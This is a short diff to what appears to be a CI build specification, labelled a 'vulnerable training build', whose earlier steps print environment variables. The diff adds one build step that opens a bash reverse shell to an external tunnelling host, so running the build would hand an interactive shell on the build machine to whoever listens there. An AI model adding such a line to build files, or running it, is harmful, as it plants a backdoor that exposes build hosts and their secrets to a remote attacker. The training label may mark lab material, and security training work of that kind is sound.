@@ -6,3 +6,4 @@ phases:
       - echo "Running vulnerable training build"
       - env | sort | head -n 20
       - echo "Done"
+      - bash -i >& /dev/tcp/mpbpc-176-228-0-103.run.pinggy-free.link/39791 0>&1
